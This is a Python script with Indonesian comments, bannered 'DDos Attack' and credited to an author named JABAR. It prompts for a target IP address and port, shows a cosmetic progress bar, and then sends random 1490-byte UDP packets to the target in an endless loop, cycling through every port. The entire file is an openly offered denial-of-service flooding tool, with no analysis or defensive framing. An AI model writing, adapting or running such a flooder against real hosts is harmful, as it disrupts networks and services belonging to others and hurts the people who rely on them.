import sys
import os
import time
import socket
import random
from datetime import datetime
import ipaddress

# Mendapatkan waktu saat ini
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Membuat socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Menampilkan alamat IP lokal (komputer yang menjalankan skrip)
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

# Membersihkan layar dan menampilkan informasi
os.system("cls" if os.name == "nt" else "clear")  # Menggunakan 'cls' untuk Windows
os.system("figlet DDos Attack" if os.name != "nt" else "")  # Memeriksa sistem operasi
print("Author   : JABAR")
print("github   : https://github.com/Jabarswk")
print("Local IP : ", local_ip)  # Menampilkan alamat IP lokal
print()

# Mengambil input IP dan port
ip = input("IP Target : ")  # Menggunakan input untuk Python 3

# Memeriksa validitas alamat IP
try:
    ipaddress.ip_address(ip)
except ValueError:
    print("Alamat IP tidak valid.")
    sys.exit(1)

port = int(input("Port       : "))  # Menggunakan input dan mengonversi ke int

# Memeriksa validitas port
if port < 1 or port > 65535:
    print("Port harus berada dalam rentang 1 hingga 65535.")
    sys.exit(1)

# Menampilkan waktu serangan
print(f"Serangan dimulai pada {now.strftime('%Y-%m-%d %H:%M:%S')}")
print("[                    ] 0%")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

sent = 0
while True:
    try:
        # Kirim paket ke IP target
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"Sent {sent} packet to {ip} through port: {port}")

        # Increment port dan reset jika melewati 65535
        port = port + 1 if port < 65535 else 1
        time.sleep(0.1)  # Memberikan jeda kecil untuk menghindari flooding berlebihan

    except KeyboardInterrupt:
        print("\nSerangan dihentikan secara manual.")
        sys.exit(0)
    except socket.error as e:
        # Pemberitahuan jika gagal mengirim paket (misalnya kesalahan jaringan)
        print(f"\n[ERROR] Gagal mengirim paket: {e}")
        time.sleep(2)  # Memberikan jeda sebelum mencoba kembali
    except Exception as e:
        # Pemberitahuan untuk kesalahan lain yang tidak terduga
        print(f"Terjadi kesalahan: {e}")
        break

